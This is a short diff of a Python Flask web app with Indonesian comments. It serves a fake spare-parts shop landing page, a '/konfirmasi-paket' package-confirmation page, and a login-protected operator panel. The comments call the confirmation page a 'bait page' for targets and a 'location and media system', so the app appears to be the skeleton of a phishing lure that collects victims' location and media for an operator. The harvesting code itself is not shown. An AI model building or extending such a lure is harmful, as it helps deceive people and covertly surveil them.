@@ -19,17 +19,16 @@ latest_output = ""
 
 @app.route('/')
 def index():
-    # Menampilkan Landing Page Utama Toko Sparepart Gear99
+    # HALAMAN UTAMA: Wajib memanggil landing.html (Toko Sparepart Gear99)
     return render_template('landing.html')
 
 @app.route('/konfirmasi-paket')
 def target_page():
-    # Menampilkan Halaman Pancingan Target Otomatisasi
+    # HALAMAN TARGET: Wajib memanggil target.html (Sistem Lokasi & Media)
     return render_template('target.html')
 
 @app.route('/operator')
 def operator():
-    # Memeriksa apakah operator sudah login atau belum
     if not session.get("logged_in"):
         return render_template('login.html')
     return render_template('operator.html')
